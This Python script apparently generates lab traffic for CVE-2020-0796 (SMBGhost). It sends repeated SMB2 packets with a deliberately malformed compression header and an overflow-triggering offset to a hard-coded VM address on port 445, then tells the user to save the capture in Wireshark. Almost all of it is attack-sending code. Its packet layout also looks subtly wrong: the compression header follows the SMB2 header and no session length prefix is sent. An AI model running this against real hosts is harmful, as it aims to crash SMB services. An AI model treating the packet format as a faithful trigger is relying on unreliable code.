import socket
import struct
import time

def create_smb2_malformed_payload():
    """
    Creates the SMB2 packet with malformed compression header
    """
    # SMB2 Header (64 bytes)
    smb2_header = (
        b"\xfe\x53\x4d\x42"      # Protocol ID: \xfeSMB (SMB2)
        b"\x40\x00"              # Structure size (64 bytes)
        b"\x00\x00"              # Credit charge
        b"\x00\x00\x00\x00"      # Status
        b"\x00\x00"              # Command: NEGOTIATE
        b"\x01\x00"              # Credits
        b"\x00\x00\x00\x00"      # Flags
        b"\x00\x00\x00\x00"      # Next command
        b"\x00\x00\x00\x00\x00\x00\x00\x00"  # Message ID
        b"\x00\x00\x00\x00"      # Process ID
        b"\x00\x00\x00\x00"      # Tree ID
        b"\x00\x00\x00\x00\x00\x00\x00\x00"  # Session ID
        b"\x00" * 16             # Signature
    )
    
    # Malformed compression header (simulating CVE-2020-0796)
    malformed_compression = (
        b"\xfc\x53\x4d\x42"      # Compression signature
        b"\x00\x00\x00\x00"      # Original size
        b"\x01\x00"              # Algorithm: LZNT1
        b"\x00\x00"              # Flags
        b"\xff\xff\xff\xff"      # MALFORMED: Offset (integer overflow trigger)
    )
    
    return smb2_header + malformed_compression

def send_smb_packet_raw(target_ip, target_port=445):
    """
    Sends SMB packet using raw TCP socket
    """
    payload = create_smb2_malformed_payload()
    
    print(f"[*] Creating TCP connection to {target_ip}:{target_port}")
    print(f"[*] Payload size: {len(payload)} bytes")
    print(f"[*] First 20 bytes: {payload[:20].hex()}")
    
    try:
        # Create TCP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        
        # Connect to target
        print(f"[*] Connecting...")
        sock.connect((target_ip, target_port))
        print(f"[✓] Connected!")
        
        # Send the malformed payload
        print(f"[*] Sending malformed SMB packet...")
        sock.send(payload)
        print(f"[✓] Payload sent!")
        
        # Try to receive response (might not get one if it crashes)
        try:
            sock.settimeout(2)
            response = sock.recv(1024)
            print(f"[*] Received response: {len(response)} bytes")
            print(f"[*] Response (hex): {response[:50].hex()}")
        except socket.timeout:
            print(f"[!] No response received (expected for malformed packet)")
        
        # Close connection
        sock.close()
        print(f"[✓] Connection closed")
        
        return True
        
    except ConnectionRefusedError:
        print(f"[✗] Connection refused - is SMB running on {target_ip}?")
        return False
    except socket.timeout:
        print(f"[✗] Connection timeout - is {target_ip} reachable?")
        return False
    except Exception as e:
        print(f"[✗] Error: {e}")
        return False

def send_normal_smb_packet(target_ip, target_port=445):
    """
    Sends a normal (non-malformed) SMB packet for comparison
    """
    # Normal SMB2 NEGOTIATE without compression
    normal_smb = (
        b"\xfe\x53\x4d\x42"      # Protocol ID
        b"\x40\x00"              # Structure size
        b"\x00\x00"              # Credit charge
        b"\x00\x00\x00\x00"      # Status
        b"\x00\x00"              # Command: NEGOTIATE
        b"\x01\x00"              # Credits
        b"\x00\x00\x00\x00"      # Flags
        b"\x00\x00\x00\x00"      # Next command
        b"\x00\x00\x00\x00\x00\x00\x00\x00"  # Message ID
        b"\x00\x00\x00\x00"      # Process ID
        b"\x00\x00\x00\x00"      # Tree ID
        b"\x00\x00\x00\x00\x00\x00\x00\x00"  # Session ID
        b"\x00" * 16             # Signature
    )
    
    print(f"\n[*] Sending NORMAL SMB packet...")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_ip, target_port))
        sock.send(normal_smb)
        
        try:
            response = sock.recv(1024)
            print(f"[✓] Normal packet sent, got {len(response)} byte response")
        except:
            pass
            
        sock.close()
        return True
    except Exception as e:
        print(f"[✗] Error sending normal packet: {e}")
        return False

# Main execution
if __name__ == "__main__":
    print("="*60)
    print("SMB PACKET SENDER (Raw Socket Method)")
    print("="*60)
    
    # IMPORTANT: Update this with your VM's IP
    target_vm = "192.168.32.20"  # <<< CHANGE THIS
    
    print(f"\n[!] Configuration:")
    print(f"    Target: {target_vm}")
    print(f"    Port: 445")
    print(f"\n[!] BEFORE continuing:")
    print(f"    1. Make sure target VM is running")
    print(f"    2. Start Wireshark on target VM")
    print(f"    3. Filter: tcp.port == 445")
    print(f"\n")
    
    input("Press ENTER when ready...")
    
    print(f"\n{'='*60}")
    print("SENDING MALFORMED PACKETS")
    print(f"{'='*60}\n")
    
    # Send 3 malformed packets
    for i in range(3):
        print(f"\n--- Packet {i+1}/3 ---")
        success = send_smb_packet_raw(target_vm)
        if success:
            print(f"[✓] Malformed packet {i+1} sent successfully")
        else:
            print(f"[✗] Failed to send packet {i+1}")
        
        if i < 2:
            time.sleep(2)  # Wait between packets
    
    # Send 1 normal packet for comparison
    print(f"\n{'='*60}")
    print("SENDING NORMAL PACKET (for comparison)")
    print(f"{'='*60}\n")
    send_normal_smb_packet(target_vm)
    
    print(f"\n{'='*60}")
    print("[✓] TEST COMPLETE")
    print(f"{'='*60}")
    print(f"\n[!] Now in Wireshark on target VM:")
    print(f"    1. Stop the capture")
    print(f"    2. You should see 4 connections to port 445")
    print(f"    3. Look at the packet data - should start with 'fe 53 4d 42'")
    print(f"    4. Save as: vulnerable_test_SOCKET.pcapng")
    print(f"    5. Copy to host machine\n")
